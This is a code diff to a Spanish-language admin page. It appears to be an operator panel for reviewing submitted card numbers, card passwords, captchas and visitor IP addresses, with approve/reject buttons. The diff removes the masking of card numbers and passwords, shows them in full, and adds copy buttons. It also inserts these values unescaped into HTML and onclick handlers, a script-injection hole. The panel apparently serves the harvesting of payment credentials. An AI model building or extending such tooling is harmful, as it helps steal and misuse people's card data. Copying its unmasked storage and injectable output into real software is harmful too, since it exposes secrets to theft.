@@ -182,6 +182,20 @@
         .btn-reject:hover {
             background: #c0031f;
         }
+        .btn-copy {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 0.9rem;
+            padding: 2px 6px;
+            border-radius: 4px;
+            transition: background 0.2s;
+            vertical-align: middle;
+            margin-left: 4px;
+        }
+        .btn-copy:hover {
+            background: #e8ecf1;
+        }
         .btn-approve:disabled,
         .btn-reject:disabled {
             opacity: 0.5;
@@ -363,12 +377,30 @@
             });
         }
 
-        function maskCardNumber(num) {
+        function formatCardNumber(num) {
             if (!num) return '-';
-            if (num.length >= 4) {
-                return num.slice(0, 4) + ' ' + '•'.repeat(Math.min(num.length - 4, 8)) + ' ' + num.slice(-4);
+            // Remove any non-digit characters and format in groups of 4
+            const cleaned = num.replace(/\D/g, '');
+            if (cleaned.length === 0) return num;
+            return cleaned.match(/.{1,4}/g)?.join(' ') || num;
+        }
+
+        async function copyToClipboard(text, label) {
+            try {
+                await navigator.clipboard.writeText(text);
+                mostrarToast(`📋 ${label} copiado al portapapeles`, 'success');
+            } catch (err) {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                mostrarToast(`📋 ${label} copiado al portapapeles`, 'success');
             }
-            return num;
         }
 
         // ═══════════════════════════════════════════════════════════════
@@ -456,12 +488,21 @@
                 const estado = item.status || 'pendiente';
                 const estadoLabel = estado.charAt(0).toUpperCase() + estado.slice(1);
                 const estadoClass = `status-${estado}`;
+                const cardNumber = item.card_number || '';
+                const cardPassword = item.card_password || '';
+                const formattedCard = formatCardNumber(cardNumber);
 
                 html += `
                     <tr>
                         <td><strong>#${item.id}</strong></td>
-                        <td>${maskCardNumber(item.card_number)}</td>
-                        <td>${item.card_password ? '••••••' : '-'}</td>
+                        <td>
+                            ${formattedCard}
+                            ${cardNumber ? `<button class="btn-copy" onclick="copyToClipboard('${cardNumber.replace(/'/g, "\\'")}', 'Número de tarjeta')" title="Copiar tarjeta">📋</button>` : ''}
+                        </td>
+                        <td>
+                            ${cardPassword || '-'}
+                            ${cardPassword ? `<button class="btn-copy" onclick="copyToClipboard('${cardPassword.replace(/'/g, "\\'")}', 'Contraseña')" title="Copiar contraseña">📋</button>` : ''}
+                        </td>
                         <td>${item.captcha || '-'}</td>
                         <td>${formatearFecha(item.created_at)}</td>
                         <td>${item.ip_address || '-'}</td>
